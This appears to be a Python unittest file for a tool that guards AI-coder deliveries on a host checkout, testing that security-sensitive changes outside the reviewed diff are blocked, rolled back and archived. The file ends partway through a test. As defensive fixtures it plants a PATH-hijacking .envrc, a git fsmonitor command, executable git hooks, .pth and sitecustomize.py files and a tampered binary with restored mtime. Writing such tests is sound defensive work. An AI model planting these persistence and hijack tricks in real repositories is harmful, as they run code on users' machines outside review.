"""py-orch-N1: the host-mode delivery hard block judges only what the task changed.

Reviewed host-mode deliveries were rolled back (FAILED) because of files the task
never touched (ignored bytecode caches, virtualenv extensions, tracked vendored
binaries) and because of test reports the project's own pytest configuration
writes during makewand's test gate; the rejection archive also dropped new
untracked files. These tests pin the corrected behaviour: untouched files never
block, inert test artifacts are cleaned up instead, security-sensitive task
changes outside the reviewed diff still block - as UNVERIFIED - and every
rejection archives new untracked files together with tracked edits.

Round 2 pins what the first fix broke or left open: filesystems that give every
file an executable bit (WSL drvfs, CIFS, exFAT), git hooks of the user or of other
checkouts (never deleted, quarantined and reported; shared hooks do not block),
user git configuration (diff.relative, color.ui, diff.noprefix, diff.context,
status.showUntrackedFiles, core.quotePath), one test-output definition shared with
the test gate, decisions on content rather than ctime, and a truthful
failure_reason when an unbacked file cannot be restored.

Round 3 pins: the hooks directory of a main checkout that has (or gains) linked
worktrees, or a core.hooksPath other checkouts use, is shared (reported, never
blocked or moved); *.sample hooks are ignored and submodule hooks are watched; a
hard link added elsewhere is no content change, and a file without a digest is
reported as unconfirmed, never as modified or lost; rollback verification only
re-hashes files whose stat moved, within the fingerprinting budget; default report
locations of jest/vitest/c8/nyc/Playwright are test output for gate and delivery;
undecodable file names never break a message; submodule edits made from a
subdirectory are reviewed; the fresh-file probe decides about executable bits; and
under the test harness no transaction covers makewand's own source tree.

Round 4 pins live in test_fix_delivery_host_block_r4.py.
"""

try:
    import _isolation  # noqa: F401
except ImportError:
    from tests import _isolation  # noqa: F401

import contextlib
import errno
import io
import json
import os
import py_compile
import re
import shutil
import stat
import subprocess
import tempfile
import time
import unittest
from pathlib import Path
from unittest.mock import MagicMock, patch

import makewand.config as config
import makewand.delivery as delivery
import makewand.git_helper as git_helper
import makewand.orchestrator as orch
from makewand.git_helper import HOST_TRANSACTION_SUPPORTED, HostWorkspaceTransaction, run_git_cmd

HELPERS = "def double(x):\n    return 2 * x\n"
IS_ROOT = hasattr(os, "geteuid") and os.geteuid() == 0


def git(path, *args):
    code, out, err = run_git_cmd(["git", *args], cwd=str(path))
    if code != 0:
        raise AssertionError(f"git {args} failed (rc={code}): {out} {err}")
    return out


@unittest.skipUnless(HOST_TRANSACTION_SUPPORTED, "requires POSIX host transaction support")
class HostDeliveryCase(unittest.TestCase):
    def setUp(self):
        tmp = tempfile.TemporaryDirectory(prefix="mw-fix-delivery-")
        self.addCleanup(self._cleanup, tmp)
        self.base = Path(tmp.name)
        self.artifacts = self.base / "artifacts"
        for name, value in (("ARTIFACTS_DIR", self.artifacts), ("SHADOW_WORKTREES_DIR", self.base / "shadow")):
            patcher = patch.object(config, name, value, create=True)
            patcher.start()
            self.addCleanup(patcher.stop)
        self.output = ""
        self.new_repo("repo")

    def _cleanup(self, tmp):
        for directory, dirs, files in os.walk(self.base):
            for name in dirs + files:
                path = os.path.join(directory, name)
                if not os.path.islink(path):
                    try:
                        os.chmod(path, 0o700)
                    except OSError:
                        pass
        tmp.cleanup()

    def new_repo(self, name):
        self.root = self.base / name
        self.root.mkdir()
        git(self.root, "init", "-q")
        git(self.root, "config", "user.name", "Fix Delivery")
        git(self.root, "config", "user.email", "fix-delivery@example.invalid")
        return self.root

    def commit(self, files, gitignore=None):
        if gitignore is not None:
            files = dict(files, **{".gitignore": gitignore})
        self.write(files)
        git(self.root, "add", "-A")
        git(self.root, "commit", "-q", "-m", "baseline")

    def write(self, files):
        for rel, data in files.items():
            path = self.root / rel
            path.parent.mkdir(parents=True, exist_ok=True)
            path.write_bytes(data if isinstance(data, bytes) else data.encode("utf-8"))

    def start(self):
        txn = HostWorkspaceTransaction(str(self.root))
        self.assertIsNone(txn.capture_pre_snapshot())
        self.assertIsNone(txn.begin())
        return txn

    def finalize(self, txn):
        out = io.StringIO()
        with contextlib.redirect_stdout(out), contextlib.redirect_stderr(out):
            txn.finalize_success()
        self.output = out.getvalue()
        return txn

    def deliver(self, task):
        txn = self.start()
        task(self.root)
        return self.finalize(txn)

    def rollback(self, txn, reason="review rejected"):
        out = io.StringIO()
        with contextlib.redirect_stdout(out), contextlib.redirect_stderr(out):
            ok = txn.rollback(reason)
        self.output = out.getvalue()
        return ok

    def assertDelivered(self, txn):
        self.assertTrue(txn.succeeded, self.output)
        self.assertEqual(txn.state, "committed")
        self.assertIsNone(txn.outcome_status)

    def assertBlocked(self, txn, *paths):
        self.assertFalse(txn.succeeded, self.output)
        self.assertEqual(txn.state, "rolled_back")
        self.assertEqual(txn.outcome_status, "UNVERIFIED")
        self.assertIn("UNVERIFIED", txn.failure_reason)
        for rel in paths:
            self.assertIn(rel, txn.failure_reason)
            self.assertIn(rel, self.output)

    def rejected_patches(self, pattern="rejected.patch"):
        return sorted(self.artifacts.glob(f"rejected_*/{pattern}"))

    def recover(self, patch_file):
        """Applies an archived patch onto the rolled-back baseline, as a user would."""
        git(self.root, "apply", "--binary", str(patch_file))


class UntouchedFilesNeverBlockTests(HostDeliveryCase):
    def test_preexisting_ignored_bytecode_is_left_alone(self):
        self.commit({"app.py": "VALUE = 1\n", "utils.py": "def one():\n    return 1\n"}, gitignore="__pycache__/\n")
        cached = Path(py_compile.compile(str(self.root / "utils.py"), doraise=True))
        stale = Path(py_compile.compile(str(self.root / "app.py"), doraise=True))
        cached_bytes, stale_bytes = cached.read_bytes(), stale.read_bytes()

        def task(root):
            (root / "app.py").write_text("from helpers import double\nVALUE = double(1)\n")
            (root / "helpers.py").write_text(HELPERS)

        txn = self.deliver(task)

        self.assertDelivered(txn)
        self.assertEqual((self.root / "helpers.py").read_text(), HELPERS)
        self.assertEqual(cached.read_bytes(), cached_bytes)
        self.assertEqual(stale.read_bytes(), stale_bytes)

    def test_preexisting_virtualenv_extension_and_vcs_checkout_do_not_block(self):
        self.commit({"app.py": "VALUE = 1\n"}, gitignore=".venv/\n")
        extension = ".venv/lib/python3.12/site-packages/fastlib/_speedups.cpython-312-x86_64-linux-gnu.so"
        self.write({extension: b"\x7fELF" + b"\0" * 60, ".venv/src/vcs-pkg/.git/HEAD": "ref: refs/heads/main\n",
                    ".venv/bin/python-tool": "#!/bin/sh\n"})
        os.chmod(self.root / ".venv/bin/python-tool", 0o755)

        txn = self.deliver(lambda root: (root / "app.py").write_text("VALUE = 2\n"))

        self.assertDelivered(txn)
        self.assertTrue((self.root / extension).exists())
        self.assertTrue((self.root / ".venv/src/vcs-pkg/.git/HEAD").exists())

    def test_unchanged_tracked_binaries_do_not_block(self):
        self.commit({"app.py": "VALUE = 1\n", "vendor/libfast.so": b"\x7fELF vendored", "firmware.bin": b"\x00\x01\x02"})

        txn = self.deliver(lambda root: (root / "app.py").write_text("VALUE = 2\n"))

        self.assertDelivered(txn)
        self.assertEqual((self.root / "app.py").read_text(), "VALUE = 2\n")

    def test_tracked_file_rewritten_with_identical_bytes_does_not_block(self):
        self.commit({"app.py": "VALUE = 1\n", "vendor/libfast.so": b"\x7fELF vendored"})

        def task(root):
            (root / "app.py").write_text("VALUE = 2\n")
            lib = root / "vendor/libfast.so"
            data = lib.read_bytes()
            lib.unlink()
            lib.write_bytes(data)  # new inode, same bytes: git checkout/stash round trips do this

        self.assertDelivered(self.deliver(task))


class InertTestArtifactTests(HostDeliveryCase):
    ARTIFACTS = {
        ".coverage": b"SQLite format 3\0",
        ".coverage.host.1234.XyZ": b"SQLite format 3\0",
        "coverage.xml": b"<coverage/>",
        "junit.xml": b"<testsuite tests='1'/>",
        "reports/junit-report.xml": b"<testsuite tests='1'/>",
        "htmlcov/index.html": b"<html></html>",
        "htmlcov/coverage_html_cb_1234.js": b"// coverage.py asset",
        ".pytest_cache/v/cache/lastfailed": b"{}",
    }

    def test_reports_written_during_the_run_are_removed_instead_of_blocking(self):
        self.commit({"app.py": "VALUE = 1\n"},
                    gitignore=".coverage\n.coverage.*\ncoverage.xml\njunit*.xml\nreports/\nhtmlcov/\n.pytest_cache/\n")

        def task(root):
            (root / "app.py").write_text("VALUE = 2\n")
            self.write(self.ARTIFACTS)

        txn = self.deliver(task)

        self.assertDelivered(txn)
        self.assertEqual((self.root / "app.py").read_text(), "VALUE = 2\n")
        for rel in list(self.ARTIFACTS) + ["reports", "htmlcov", ".pytest_cache"]:
            self.assertFalse(os.path.lexists(self.root / rel), rel)

    def test_preexisting_report_updated_or_deleted_by_the_run_does_not_block(self):
        self.commit({"app.py": "VALUE = 1\n"}, gitignore="junit.xml\n.coverage\n")
        self.write({"junit.xml": "<testsuite tests='1'/>", ".coverage": b"old data"})

        def task(root):
            (root / "app.py").write_text("VALUE = 2\n")
            (root / "junit.xml").write_text("<testsuite tests='2'/>")
            (root / ".coverage").unlink()

        txn = self.deliver(task)

        self.assertDelivered(txn)
        self.assertEqual((self.root / "junit.xml").read_text(), "<testsuite tests='2'/>")

    def test_code_or_executables_in_report_locations_still_block(self):
        cases = (
            ("junit.xml", "junit.xml\n", 0o755),  # an inert name with an executable bit
            ("htmlcov/conftest.py", "htmlcov/\n", 0o644),  # pytest would import it
            (".pytest_cache/v/evil.so", ".pytest_cache/\n", 0o644),
        )
        for index, (rel, ignore, mode) in enumerate(cases):
            with self.subTest(rel=rel):
                self.new_repo(f"case{index}")
                self.commit({"app.py": "VALUE = 1\n"}, gitignore=ignore)

                def task(root, rel=rel, mode=mode):
                    (root / "app.py").write_text("VALUE = 2\n")
                    self.write({rel: "payload\n"})
                    os.chmod(root / rel, mode)

                txn = self.deliver(task)

                self.assertBlocked(txn, rel)
                self.assertFalse(os.path.lexists(self.root / rel))
                self.assertEqual((self.root / "app.py").read_text(), "VALUE = 1\n")


class SecuritySensitiveChangeTests(HostDeliveryCase):
    def test_sensitive_files_outside_the_reviewed_diff_block_as_unverified(self):
        cases = (
            (".envrc", ".envrc\n"),
            (".env.local", ".env*\n"),
            ("build/libevil.so", "build/\n"),
            (".venv/lib/python3.12/site-packages/evil.pth", ".venv/\n"),
            ("sitecustomize.py", "sitecustomize.py\n"),
            (".husky/pre-commit", ".husky/\n"),
            ("tools/run-me", "tools/\n"),  # gains an executable bit
        )
        for index, (rel, ignore) in enumerate(cases):
            with self.subTest(rel=rel):
                self.new_repo(f"case{index}")
                self.commit({"app.py": "VALUE = 1\n"}, gitignore=ignore)

                def task(root, rel=rel):
                    (root / "app.py").write_text("VALUE = 2\n")
                    self.write({rel: "import os\n"})
                    if rel == "tools/run-me":
                        os.chmod(root / rel, 0o755)

                txn = self.deliver(task)

                self.assertBlocked(txn, rel)
                self.assertFalse(os.path.lexists(self.root / rel))
                self.assertEqual((self.root / "app.py").read_text(), "VALUE = 1\n")

    def test_tampered_binary_with_restored_mtime_is_detected_and_restored(self):
        self.commit({"app.py": "VALUE = 1\n"}, gitignore="*.so\n")
        original, hostile = b"\x7fELF original payload", b"\x7fELF hostile payload!"
        self.assertEqual(len(hostile), len(original))
        self.write({"lib/native.so": original})
        lib = self.root / "lib/native.so"

        def task(root):
            (root / "app.py").write_text("VALUE = 2\n")
            info = os.stat(lib)
            lib.write_bytes(hostile)  # same size, same inode
            os.utime(lib, ns=(info.st_atime_ns, info.st_mtime_ns))

        txn = self.deliver(task)

        self.assertBlocked(txn, "lib/native.so")
        self.assertEqual(lib.read_bytes(), original)
        self.assertEqual((self.root / "app.py").read_text(), "VALUE = 1\n")

    def test_executable_bit_the_review_diff_cannot_show_blocks(self):
        self.commit({"app.py": "VALUE = 1\n", "run.sh": "echo hi\n"})
        git(self.root, "config", "core.fileMode", "false")

        def task(root):
            (root / "app.py").write_text("VALUE = 2\n")
            os.chmod(root / "run.sh", 0o755)

        txn = self.deliver(task)

        self.assertBlocked(txn, "run.sh")
        self.assertFalse(os.stat(self.root / "run.sh").st_mode & 0o111)
        self.assertEqual((self.root / "app.py").read_text(), "VALUE = 1\n")

    def test_executable_bit_shown_by_the_review_diff_is_delivered(self):
        self.commit({"app.py": "VALUE = 1\n", "run.sh": "echo hi\n"})

        def task(root):
            os.chmod(root / "run.sh", 0o755)
            (root / "tool.sh").write_text("#!/bin/sh\necho tool\n")
            os.chmod(root / "tool.sh", 0o755)

        txn = self.deliver(task)

        self.assertDelivered(txn)
        self.assertTrue(os.stat(self.root / "run.sh").st_mode & 0o100)
        self.assertTrue(os.stat(self.root / "tool.sh").st_mode & 0o100)

    def test_new_nested_git_metadata_blocks_and_is_removed(self):
        self.commit({"app.py": "VALUE = 1\n", "lib/a.txt": "keep\n"})

        def task(root):
            (root / "app.py").write_text("VALUE = 2\n")
            self.write({"lib/.git/config": "[core]\n\tfsmonitor = touch hooked\n",
                        "lib/.git/hooks/post-checkout": "#!/bin/sh\ntouch hooked\n"})
            os.chmod(root / "lib/.git/hooks/post-checkout", 0o755)

        txn = self.deliver(task)

        self.assertBlocked(txn, "lib/.git")
        self.assertFalse(os.path.lexists(self.root / "lib/.git"))
        self.assertEqual((self.root / "lib/a.txt").read_text(), "keep\n")
        self.assertEqual((self.root / "app.py").read_text(), "VALUE = 1\n")

    def test_hook_added_to_the_repository_blocks_and_is_quarantined(self):
        self.commit({"app.py": "VALUE = 1\n"})
        hook = self.root / ".git/hooks/pre-commit"

        def task(root):
            (root / "app.py").write_text("VALUE = 2\n")
            hook.parent.mkdir(exist_ok=True)
            hook.write_text("#!/bin/sh\ntouch hooked\n")
            os.chmod(hook, 0o755)

        txn = self.deliver(task)

        self.assertBlocked(txn, ".git/hooks/pre-commit")
        self.assertFalse(os.path.lexists(hook))
        kept = txn._rejected_dir / "quarantine" / "git-hooks" / "pre-commit"
        self.assertEqual(kept.read_text(), "#!/bin/sh\ntouch hooked\n")
        self.assertIn(str(kept), self.output)
        self.assertEqual((self.root / "app.py").read_text(), "VALUE = 1\n")

    def test_modified_repository_hook_blocks_and_is_reported(self):
        self.commit({"app.py": "VALUE = 1\n"})
        hook = self.root / ".git/hooks/post-checkout"
        hook.parent.mkdir(exist_ok=True)
        hook.write_text("#!/bin/sh\nexit 0\n")
        os.chmod(hook, 0o755)

        def task(root):
            (root / "app.py").write_text("VALUE = 2\n")
            with open(hook, "a", encoding="utf-8") as handle:
                handle.write("touch hooked\n")

        txn = self.deliver(task)

        self.assertBlocked(txn, ".git/hooks/post-checkout")
        self.assertIn("无法自动恢复", self.output)
        self.assertEqual((self.root / "app.py").read_text(), "VALUE = 1\n")

    def test_preexisting_nested_git_metadata_deleted_by_the_task_blocks(self):
        self.commit({"app.py": "VALUE = 1\n"}, gitignore=".venv/\n")
        self.write({".venv/src/vcs-pkg/.git/HEAD": "ref: refs/heads/main\n", ".venv/src/vcs-pkg/setup.py": "x = 1\n"})

        def task(root):
            (root / "app.py").write_text("VALUE = 2\n")
            os.unlink(root / ".venv/src/vcs-pkg/.git/HEAD")
            os.rmdir(root / ".venv/src/vcs-pkg/.git")

        txn = self.deliver(task)

        self.assertBlocked(txn, ".venv/src/vcs-pkg/.git")
        self.assertEqual((self.root / "app.py").read_text(), "VALUE = 1\n")

    def test_ignored_file_replaced_by_a_directory_blocks_and_is_restored(self):
        self.commit({"app.py": "VALUE = 1\n"}, gitignore="data.json\n")
        self.write({"data.json": '{"user": "data"}\n'})

        def task(root):
            (root / "app.py").write_text("VALUE = 2\n")
            (root / "data.json").unlink()
            (root / "data.json").mkdir()

        txn = self.deliver(task)

        self.assertBlocked(txn, "data.json")
        self.assertEqual((self.root / "data.json").read_text(), '{"user": "data"}\n')

    @unittest.skipIf(IS_ROOT, "root can read chmod 000 directories")
    def test_directory_hidden_from_the_delivery_scan_blocks(self):
        self.commit({"app.py": "VALUE = 1\n"}, gitignore="cache/\n")

        def task(root):
            (root / "app.py").write_text("VALUE = 2\n")
            self.write({"cache/hidden/payload.so": b"\x7fELF"})
            os.chmod(root / "cache/hidden", 0)

        txn = self.deliver(task)

        self.assertFalse(txn.succeeded)
        self.assertEqual(txn.outcome_status, "UNVERIFIED")
        self.assertIn("扫描不完整", txn.failure_reason)
        self.assertEqual((self.root / "app.py").read_text(), "VALUE = 1\n")

    def test_unknown_review_scope_fails_closed(self):
        self.commit({"app.py": "VALUE = 1\n"})
        txn = self.start()
        (self.root / "app.py").write_text("VALUE = 2\n")

        with patch.object(git_helper, "_read_workspace_diff", return_value=(b"", "simulated git failure")):
            self.finalize(txn)

        self.assertBlocked(txn)
        self.assertIn("simulated git failure", txn.failure_reason)
        self.assertEqual((self.root / "app.py").read_text(), "VALUE = 1\n")


class RejectionArchiveTests(HostDeliveryCase):
    def test_rollback_archives_new_untracked_files_with_tracked_edits(self):
        self.commit({"app.py": "VALUE = 1\n"})
        txn = self.start()
        (self.root / "app.py").write_text("from helpers import double\nVALUE = double(1)\n")
        self.write({"helpers.py": HELPERS, "assets/logo.bin": bytes(range(256))})

        self.assertTrue(self.rollback(txn), self.output)

        self.assertFalse((self.root / "helpers.py").exists())
        self.assertEqual((self.root / "app.py").read_text(), "VALUE = 1\n")
        patches = self.rejected_patches()
        self.assertEqual(len(patches), 1)
        manifest = json.loads((patches[0].parent / "manifest.json").read_text())
        self.assertTrue(manifest["includes_untracked_files"])
        self.assertTrue(manifest["complete"])
        self.recover(patches[0])
        self.assertEqual((self.root / "helpers.py").read_text(), HELPERS)
        self.assertEqual((self.root / "app.py").read_text(), "from helpers import double\nVALUE = double(1)\n")
        self.assertEqual((self.root / "assets/logo.bin").read_bytes(), bytes(range(256)))

    def test_hard_block_archives_the_reviewed_new_file_it_deletes(self):
        self.commit({"app.py": "VALUE = 1\n"}, gitignore=".envrc\n")

        def task(root):
            (root / "app.py").write_text("from helpers import double\nVALUE = double(1)\n")
            self.write({"helpers.py": HELPERS, ".envrc": "export PATH=/tmp/evil:$PATH\n"})

        txn = self.deliver(task)

        self.assertBlocked(txn, ".envrc")
        self.assertFalse((self.root / "helpers.py").exists())
        self.assertFalse((self.root / ".envrc").exists())
        self.assertIn(str(txn._rejected_dir), txn.failure_reason)
        self.recover(txn._rejected_dir / "rejected.patch")
        self.assertEqual((self.root / "helpers.py").read_text(), HELPERS)

    def test_task_commits_and_untracked_files_are_archived(self):
        self.commit({"app.py": "VALUE = 1\n"})
        txn = self.start()
        (self.root / "app.py").write_text("VALUE = 2\n")
        git(self.root, "commit", "-q", "-a", "-m", "task commit")
        self.write({"notes.txt": "follow-up\n"})

        self.assertTrue(self.rollback(txn), self.output)

        self.assertEqual((self.root / "app.py").read_text(), "VALUE = 1\n")
        self.recover(self.rejected_patches()[0])
        self.assertEqual((self.root / "app.py").read_text(), "VALUE = 2\n")
        self.assertEqual((self.root / "notes.txt").read_text(), "follow-up\n")

    def test_unborn_repository_rejection_archives_new_files(self):
        txn = self.start()
        self.assertIsNone(txn.baseline_commit)
        self.write({"main.py": "print('new project')\n"})

        self.assertTrue(self.rollback(txn), self.output)

        self.assertFalse((self.root / "main.py").exists())
        self.recover(self.rejected_patches()[0])
        self.assertEqual((self.root / "main.py").read_text(), "print('new project')\n")

    @unittest.skipIf(IS_ROOT, "root can read chmod 000 files")
    def test_new_file_missing_from_the_patch_is_quarantined_not_deleted(self):
        self.commit({"app.py": "VALUE = 1\n"})
        txn = self.start()
        (self.root / "app.py").write_text("VALUE = 2\n")
        self.write({"helpers.py": HELPERS, "draft.txt": "only copy\n"})
        os.chmod(self.root / "draft.txt", 0)  # git cannot hash it, so no full patch

        self.assertTrue(self.rollback(txn), self.output)

        self.assertFalse(os.path.lexists(self.root / "draft.txt"))
        self.assertFalse(os.path.lexists(self.root / "helpers.py"))
        quarantine = txn._rejected_dir / "quarantine"
        os.chmod(quarantine / "draft.txt", 0o600)
        self.assertEqual((quarantine / "draft.txt").read_text(), "only copy\n")
        self.assertEqual((quarantine / "helpers.py").read_text(), HELPERS)
        self.assertIn("VALUE = 2", (txn._rejected_dir / "rejected.patch").read_text())
        self.assertEqual((self.root / "app.py").read_text(), "VALUE = 1\n")


class SubmoduleTests(HostDeliveryCase):
    def setUp(self):
        super().setUp()
        source = self.base / "sub_source"
        source.mkdir()
        git(source, "init", "-q")
        git(source, "config", "user.name", "Fix Delivery")
        git(source, "config", "user.email", "fix-delivery@example.invalid")
        (source / "lib.py").write_text("X = 1\n")
        git(source, "add", "-A")
        git(source, "commit", "-q", "-m", "submodule baseline")
        self.commit({"app.py": "VALUE = 1\n"})
        git(self.root, "-c", "protocol.file.allow=always", "submodule", "add", "-q", str(source), "sub")
        git(self.root, "commit", "-q", "-m", "add submodule")

    def test_reviewed_new_file_in_a_submodule_is_delivered(self):
        def task(root):
            (root / "app.py").write_text("VALUE = 2\n")
            (root / "sub/extra.py").write_text("Y = 2\n")

        txn = self.deliver(task)

        self.assertDelivered(txn)
        self.assertEqual((self.root / "sub/extra.py").read_text(), "Y = 2\n")

    def test_rejection_archives_new_submodule_files(self):
        txn = self.start()
        (self.root / "sub/extra.py").write_text("Y = 2\n")

        self.assertTrue(self.rollback(txn), self.output)

        self.assertFalse((self.root / "sub/extra.py").exists())
        patches = self.rejected_patches("rejected.submodule-*.patch")
        self.assertEqual(len(patches), 1)
        git(self.root / "sub", "apply", "--binary", str(patches[0]))
        self.assertEqual((self.root / "sub/extra.py").read_text(), "Y = 2\n")

    def add_subdirectory(self):
        self.write({"pkg/mod.py": "M = 1\n"})
        git(self.root, "add", "-A")
        git(self.root, "commit", "-q", "-m", "pkg")
        return self.root / "pkg"

    def test_submodule_edit_made_from_a_subdirectory_is_reviewed_and_delivered(self):
        txn = HostWorkspaceTransaction(str(self.add_subdirectory()))
        self.assertIsNone(txn.capture_pre_snapshot())
        self.assertIsNone(txn.begin())
        self.write({"pkg/mod.py": "M = 2\n", "sub/lib.py": "X = 2\n"})

        self.finalize(txn)

        self.assertDelivered(txn)
        self.assertEqual((self.root / "sub/lib.py").read_text(), "X = 2\n")

    def test_review_diff_from_a_subdirectory_includes_submodule_changes(self):
        pkg = self.add_subdirectory()
        (self.root / "sub/lib.py").write_text("X = 2\n")

        diff, error = git_helper.get_git_diff_status(str(pkg))

        self.assertIsNone(error)
        self.assertIn("[Submodule: sub]", diff)
        self.assertIn("+X = 2", diff)

    def test_unreviewed_file_inside_a_submodule_is_not_called_an_ignored_file(self):
        exclude = Path(git(self.root / "sub", "rev-parse", "--path-format=absolute", "--git-dir").strip()) / "info/exclude"
        exclude.parent.mkdir(parents=True, exist_ok=True)
        exclude.write_text("cache.json\n")  # ignored by the submodule, so in neither diff

        def task(root):
            (root / "app.py").write_text("VALUE = 2\n")
            (root / "sub/cache.json").write_text("{}\n")

        txn = self.deliver(task)

        self.assertBlocked(txn, "sub/cache.json")
        self.assertIn("子模块或嵌套 Git 仓库", txn.failure_reason)
        self.assertNotIn("被 .gitignore 忽略", txn.failure_reason)

    def test_hook_planted_in_a_submodule_blocks_and_is_quarantined(self):
        hook = Path(git(self.root / "sub", "rev-parse", "--path-format=absolute", "--git-common-dir").strip()) / "hooks/post-checkout"

        def task(root):
            (root / "app.py").write_text("VALUE = 2\n")
            hook.parent.mkdir(exist_ok=True)
            hook.write_text("#!/bin/sh\ntouch hooked\n")
            os.chmod(hook, 0o755)

        txn = self.deliver(task)

        self.assertBlocked(txn, ".git/modules/sub/hooks/post-checkout")
        self.assertFalse(os.path.lexists(hook))
        kept = txn._rejected_dir / "quarantine" / "git-hooks" / "post-checkout"
        self.assertEqual(kept.read_text(), "#!/bin/sh\ntouch hooked\n")


class PipelineHostModeTests(HostDeliveryCase):
    """run_pipeline in host mode; only provider dispatch, routing and the test runner are mocked."""

    def run_pipeline(self, coder, tests, cwd=None, review_prompts=None):
        def dispatch(engine, prompt_text, cwd=None, readonly=False, **kwargs):
            if readonly:
                if review_prompts is not None:
                    review_prompts.append(prompt_text)
                return True, 'MAKEWAND_VERDICT: {"pass": true, "defects": []}', None
            return coder(Path(cwd))

        route = (["codex"], ["claude"], {"primary_coder": "codex", "primary_reviewer": "claude", "reasons": []})
        out = io.StringIO()
        with contextlib.ExitStack() as stack:
            stack.enter_context(patch.object(orch, "check_load_backpressure", return_value=True))
            stack.enter_context(patch.object(orch, "check_working_tree_isolation", return_value=(True, None)))
            stack.enter_context(patch.object(orch, "get_or_update_status", return_value={}))
            stack.enter_context(patch.object(orch, "classify_prompt_intent", return_value="code"))
            stack.enter_context(patch.object(orch, "select_optimal_engine_pair", return_value=route))
            stack.enter_context(patch.object(orch, "dispatch_task", side_effect=dispatch))
            stack.enter_context(patch.object(orch, "run_local_tests", side_effect=tests))
            stack.enter_context(patch("makewand.memory.format_memory_hints_for_prompt", return_value=""))
            stack.enter_context(contextlib.redirect_stdout(out))
            stack.enter_context(contextlib.redirect_stderr(out))
            result = orch.run_pipeline("Add helpers.double and use it in app.py", cwd=str(cwd or self.root), auto_fix=False)
        self.output = out.getvalue()
        return result

    def test_reviewed_delivery_with_preexisting_bytecode_and_test_reports_passes(self):
        self.commit({"app.py": "VALUE = 1\n"}, gitignore="__pycache__/\njunit.xml\n.coverage\n")
        cached = Path(py_compile.compile(str(self.root / "app.py"), doraise=True))

        def coder(cwd):
            (cwd / "app.py").write_text("from helpers import double\nVALUE = double(1)\n")
            (cwd / "helpers.py").write_text(HELPERS)
            return True, "implemented", None

        def tests(cwd, timeout=60):
            # The project's own pytest configuration (--junitxml, --cov) writes reports.
            (Path(cwd) / "junit.xml").write_text("<testsuite tests='1'/>")
            (Path(cwd) / ".coverage").write_bytes(b"SQLite format 3\0")
            return True, "1 passed in 0.01s"

        self.assertTrue(self.run_pipeline(coder, tests), self.output)

        self.assertEqual((self.root / "helpers.py").read_text(), HELPERS)
        self.assertTrue(cached.exists())
        self.assertFalse((self.root / "junit.xml").exists())
        self.assertFalse((self.root / ".coverage").exists())
        self.assertNotIn("安全阻断", self.output)

    def test_report_formats_the_test_gate_accepts_do_not_block_delivery(self):
        # --cov-report=lcov / --junitxml=report.xml / hypothesis: accepted by the gate, so delivered.
        self.commit({"app.py": "VALUE = 1\n"}, gitignore="__pycache__/\n.coverage\ncoverage.lcov\nreport.xml\n.hypothesis/\n")

        def coder(cwd):
            (cwd / "app.py").write_text("from helpers import double\nVALUE = double(1)\n")
            (cwd / "helpers.py").write_text(HELPERS)
            return True, "implemented", None

        def tests(cwd, timeout=60):
            root = Path(cwd)
            (root / "coverage.lcov").write_text("TN:\nSF:app.py\nend_of_record\n")
            (root / "report.xml").write_text("<testsuite tests='1'/>")
            (root / ".hypothesis/examples/1a2b").mkdir(parents=True)
            (root / ".hypothesis/examples/1a2b/3c4d").write_bytes(b"\x00\x01")
            return True, "1 passed in 0.01s"

        self.assertTrue(self.run_pipeline(coder, tests), self.output)

        self.assertEqual((self.root / "helpers.py").read_text(), HELPERS)
        for rel in ("coverage.lcov", "report.xml", ".hypothesis"):
            self.assertFalse(os.path.lexists(self.root / rel), rel)
        self.assertNotIn("安全阻断", self.output)

    def test_hook_installed_from_a_linked_worktree_does_not_block_the_main_checkout(self):
        self.commit({"app.py": "VALUE = 1\n"}, gitignore="__pycache__/\n")
        git(self.root, "worktree", "add", "-q", "-b", "feature", str(self.base / "linked"))
        hook = self.root / ".git/hooks/pre-commit"

        def coder(cwd):
            (cwd / "app.py").write_text("from helpers import double\nVALUE = double(1)\n")
            (cwd / "helpers.py").write_text(HELPERS)
            # Meanwhile the user runs `pre-commit install` in the linked worktree.
            hook.write_text("#!/bin/sh\nexec pre-commit hook-impl --hook-type=pre-commit \"$@\"\n")
            os.chmod(hook, 0o755)
            return True, "implemented", None

        self.assertTrue(self.run_pipeline(coder, lambda cwd, timeout=60: (True, "1 passed in 0.01s")), self.output)

        self.assertEqual((self.root / "helpers.py").read_text(), HELPERS)
        self.assertTrue(hook.exists())
        self.assertIn(os.path.realpath(hook.parent), self.output)
        self.assertNotIn("安全阻断", self.output)

    def test_submodule_edit_from_a_subdirectory_is_reviewed_and_delivered(self):
        source = self.base / "sub_source"
        source.mkdir()
        git(source, "init", "-q")
        git(source, "config", "user.name", "Fix Delivery")
        git(source, "config", "user.email", "fix-delivery@example.invalid")
        (source / "lib.py").write_text("X = 1\n")
        git(source, "add", "-A")
        git(source, "commit", "-q", "-m", "submodule baseline")
        self.commit({"app.py": "VALUE = 1\n", "pkg/mod.py": "M = 1\n"}, gitignore="__pycache__/\n")
        git(self.root, "-c", "protocol.file.allow=always", "submodule", "add", "-q", str(source), "sub")
        git(self.root, "commit", "-q", "-m", "add submodule")
        prompts = []

        def coder(cwd):
            (self.root / "pkg/mod.py").write_text("M = 2\n")
            (self.root / "sub/lib.py").write_text("X = 2\n")
            return True, "implemented", None

        result = self.run_pipeline(coder, lambda cwd, timeout=60: (True, "1 passed in 0.01s"),
                                   cwd=self.root / "pkg", review_prompts=prompts)

        self.assertTrue(result, self.output)
        self.assertIn("[Submodule: sub]", "\n".join(prompts))
        self.assertIn("+X = 2", "\n".join(prompts))
        self.assertEqual((self.root / "sub/lib.py").read_text(), "X = 2\n")
        self.assertEqual((self.root / "pkg/mod.py").read_text(), "M = 2\n")


def chmod_tree(root, mode):
    for path in root.rglob("*"):
        if ".git" not in path.relative_to(root).parts:
            os.chmod(path, mode)


class FixedModeFilesystemTests(HostDeliveryCase):
    """WSL drvfs, CIFS (file_mode=0755) and exFAT/NTFS mounts give every file the same
    mode, executable bit included; git records core.fileMode=false there."""

    def test_new_files_on_a_filesystem_that_sets_every_executable_bit_are_delivered(self):
        for index, mode in enumerate((0o777, 0o755)):
            with self.subTest(mode=oct(mode)):
                if index:
                    self.new_repo(f"case{index}")
                self.commit({"app.py": "VALUE = 1\n", "README.md": "x\n"}, gitignore="junit.xml\n")
                git(self.root, "config", "core.fileMode", "false")
                chmod_tree(self.root, mode)

                def task(root, mode=mode):
                    (root / "app.py").write_text("from helpers import double\nVALUE = double(1)\n")
                    self.write({"helpers.py": HELPERS, "junit.xml": "<testsuite tests='1'/>"})
                    for rel in ("app.py", "helpers.py", "junit.xml"):
                        os.chmod(root / rel, mode)

